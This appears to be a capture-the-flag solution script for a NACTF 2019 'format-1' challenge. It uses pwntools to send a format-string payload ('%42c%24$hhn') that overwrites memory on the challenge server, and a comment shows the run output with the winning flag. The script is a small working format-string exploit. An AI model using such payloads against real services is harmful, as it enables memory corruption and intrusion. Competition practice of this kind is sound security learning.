from pwn import *

context.arch = 'i386'

con = remote('shell.2019.nactf.com', 31560)
con.recvregex('Type something>')

payload = '%42c%24$hhn'
con.sendline(payload)

print con.recvall()

'''
$ python format-1.py
[+] Opening connection to shell.2019.nactf.com on port 31560: Done
[+] Receiving all data: Done (98B)
[*] Closed connection to shell.2019.nactf.com port 31560
You typed:                                          @
You win!
nactf{Pr1ntF_wr1t3s_t0o_rZFCUmba}
'''
